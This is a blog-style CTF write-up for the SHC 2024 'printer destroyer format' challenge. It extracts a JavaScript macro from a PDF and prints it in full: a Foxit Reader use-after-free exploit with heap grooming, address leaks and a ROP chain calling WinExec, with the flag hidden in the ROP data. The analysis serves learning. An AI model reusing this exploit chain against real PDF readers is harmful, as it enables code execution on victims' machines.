<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>Shc 2024_printer Destroyer Format :: Terminal</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content=" I received a todo list from IT which I really need to complete.
Clippy is telling lies and says it is not safe to open this PDF :(
Stupid Clippy
For that challenge, we got a pdf file in which we can expect some sort of macro if we believe what we’re told in the intro.
The tool pdfextract from the origami repository is incredibly helpful, as it extracts everything we might be interested in for a ctf challenge : images, streams, scripts and attachments, and creates a directory in which it puts everything.
" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="//localhost:1313/posts/shc-2024_printer-destroyer-format/" />





  
  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/main.min.fe8dc560fccb53a458b0db19ccb7b265764ac46b68596b7e099c6793054dd457.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/post.min.fc74ca360273c1d828da3c02b8174eba435607b369d98418ccc6f2243cd4e75d.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.dd0bf9c7cacb24c1b0184f52f1869b274e06689557468cc7030ccf632328eb97.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">







<link rel="shortcut icon" href="//localhost:1313/favicon.png">
<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Shc 2024_printer Destroyer Format">
<meta property="og:description" content=" I received a todo list from IT which I really need to complete.
Clippy is telling lies and says it is not safe to open this PDF :(
Stupid Clippy
For that challenge, we got a pdf file in which we can expect some sort of macro if we believe what we’re told in the intro.
The tool pdfextract from the origami repository is incredibly helpful, as it extracts everything we might be interested in for a ctf challenge : images, streams, scripts and attachments, and creates a directory in which it puts everything.
" />
<meta property="og:url" content="//localhost:1313/posts/shc-2024_printer-destroyer-format/" />
<meta property="og:site_name" content="Terminal" />

  <meta property="og:image" content="//localhost:1313/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2024-05-06 02:59:11 &#43;0200 CEST" />












</head>
<body>


<div class="container center">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Terminal
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/showcase">Showcase</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about" >About</a></li>
        
      
        
          <li><a href="/showcase" >Showcase</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="//localhost:1313/posts/shc-2024_printer-destroyer-format/">Shc 2024_printer Destroyer Format</a>
  </h1>
  <div class="post-meta"><time class="post-date">2024-05-06</time></div>

  
    <span class="post-tags">
      
      #<a href="//localhost:1313/tags/shc-2024/">SHC-2024</a>&nbsp;
      
      #<a href="//localhost:1313/tags/reverse-engineering/">reverse-engineering</a>&nbsp;
      
    </span>
  
  


  
    <div class="table-of-contents">
      <h2>
        Table of Contents
      </h2>
      <nav id="TableOfContents"></nav>
    </div>
  

  <div class="post-content"><div>
        <blockquote>
<p>I received a todo list from IT which I really need to complete.<br>
Clippy is telling lies and says it is not safe to open this PDF :(<br>
Stupid Clippy</p>
</blockquote>
<p>For that challenge, we got a pdf file in which we can expect some sort of macro if we believe what we’re told in the intro.</p>
<p>The tool <code>pdfextract</code> from the origami repository is incredibly helpful, as it extracts everything we might be interested in for a ctf challenge : images, streams, scripts and attachments, and creates a directory in which it puts everything.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>➜  printer-destroyer-format pdfextract todo-list.pdf
</span></span><span style="display:flex;"><span>➜  printer-destroyer-format tree
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>├── todo-list.dump
</span></span><span style="display:flex;"><span>│   ├── attachments
</span></span><span style="display:flex;"><span>│   ├── fonts
</span></span><span style="display:flex;"><span>│   │   └── BCDFEE+Aptos
</span></span><span style="display:flex;"><span>│   ├── images
</span></span><span style="display:flex;"><span>│   ├── scripts
</span></span><span style="display:flex;"><span>│   │   └── script_3292974706880921474.js
</span></span><span style="display:flex;"><span>│   └── streams
</span></span><span style="display:flex;"><span>│       ├── stream_17.dmp
</span></span><span style="display:flex;"><span>│       ├── stream_4.dmp
</span></span><span style="display:flex;"><span>│       ├── stream_49.dmp
</span></span><span style="display:flex;"><span>│       └── stream_65.dmp
</span></span><span style="display:flex;"><span>└── todo-list.pdf
</span></span></code></pre></div><p>As we can see, it extracted a script (which was huge hex-encoded block in the hexdump, I had to decode it manually). It looks like this :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">heap_ptr</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">foxit_base</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">pwn_array</span> <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">prepare_heap</span>(<span style="color:#a6e22e">size</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Array(<span style="color:#a6e22e">size</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">size</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">arr</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">addAnnot</span>({ <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Text&#34;</span> });;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">arr</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;object&#34;</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">arr</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">destroy</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">gc</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">maxMallocBytes</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">128</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100000</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#a6e22e">maxMallocBytes</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">alloc_at_leak</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x64</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pwn_array</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Int32Array</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">0x40</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">control_memory</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x64</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">pwn_array</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">j</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">pwn_array</span>[<span style="color:#a6e22e">i</span>][<span style="color:#a6e22e">j</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">foxit_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x01a7ee23</span>; <span style="color:#75715e">// push ecx; pop esp; pop ebp; ret 4
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">leak_vtable</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">addAnnot</span>({ <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Text&#34;</span> });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">destroy</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gc</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">prepare_heap</span>(<span style="color:#ae81ff">0x400</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">test</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">0x60</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stolen</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Int32Array</span>(<span style="color:#a6e22e">test</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">leaked</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stolen</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff0000</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">foxit_base</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">leaked</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x01f50000</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">leak_heap_chunk</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">addAnnot</span>({ <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Text&#34;</span> });
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">destroy</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">prepare_heap</span>(<span style="color:#ae81ff">0x400</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">test</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">0x60</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stolen</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Int32Array</span>(<span style="color:#a6e22e">test</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">alloc_at_leak</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">heap_ptr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stolen</span>[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">reclaim</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Array(<span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">arr</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">arr</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">0x60</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">rop</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Int32Array</span>(<span style="color:#a6e22e">arr</span>[<span style="color:#a6e22e">i</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x00</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">heap_ptr</span>;                <span style="color:#75715e">// pointer to our stack pivot from the TypedArray leak
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x01</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">foxit_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x01a11d09</span>; <span style="color:#75715e">// xor ebx,ebx; or [eax],eax; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x02</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x72727272</span>;              <span style="color:#75715e">// junk
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x03</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">foxit_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00001450</span>  <span style="color:#75715e">// pop ebp; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x04</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;              <span style="color:#75715e">// ret of WinExec
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x05</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">foxit_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0069a802</span>; <span style="color:#75715e">// pop eax; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x06</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">foxit_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x01f2257c</span>; <span style="color:#75715e">// IAT WinExec
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x07</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">foxit_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000c6c0</span>; <span style="color:#75715e">// mov eax,[eax]; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x08</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">foxit_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00049d4e</span>; <span style="color:#75715e">// xchg esi,eax; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x09</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">foxit_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00025cd6</span>; <span style="color:#75715e">// pop edi; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x0a</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">foxit_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0041c6ca</span>; <span style="color:#75715e">// ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x0b</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">foxit_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000254fc</span>; <span style="color:#75715e">// pushad; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x0c</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x32636873</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x0d</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7b343230</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x0e</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x70696c63</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x0f</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x635f7970</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x10</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5f746e61</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x11</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x706c6568</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x12</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x756f795f</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x13</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7d21215f</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x14</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x15</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x16</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x17</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>; <span style="color:#75715e">// adios, amigo :) (from original exploit from https://www.exploit-db.com/exploits/44941)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">trigger_uaf</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">that</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">addAnnot</span>({ <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Text&#34;</span>, <span style="color:#a6e22e">page</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;uaf&#34;</span> });
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>    Object.<span style="color:#a6e22e">defineProperties</span>(<span style="color:#a6e22e">arr</span>, {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">get</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">that</span>.<span style="color:#a6e22e">getAnnot</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;uaf&#34;</span>).<span style="color:#a6e22e">destroy</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reclaim</span>();
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">point</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arr</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">leak_heap_chunk</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">leak_vtable</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">control_memory</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">trigger_uaf</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>();
</span></span></code></pre></div><p>Looking at the code, we can quickly understand that it’s a pretty sophisticated pwn exploit, as we see some heap manipulation. Searching through exploit-db for the first lines of that exploit, we discover that it’s the exact copy of a Foxit Reader exploit from 2018. Actually, <em>not an exact copy</em> as we see that there’s something strange in the shellcode, something not commented, looking like hexadecimal :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x0c</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x32636873</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x0d</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7b343230</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x0e</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x70696c63</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x0f</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x635f7970</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x10</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5f746e61</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x11</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x706c6568</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x12</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x756f795f</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x13</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7d21215f</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x14</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x15</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rop</span>[<span style="color:#ae81ff">0x16</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>
</span></span></code></pre></div><p>If we go and decode these values, we get the flag : <code>shc2024{clippy_cant_help_you_!!}</code></p>

      </div></div>

  
    
<div class="pagination">
  <div class="pagination__title">
    <span class="pagination__title-h">Read other posts</span>
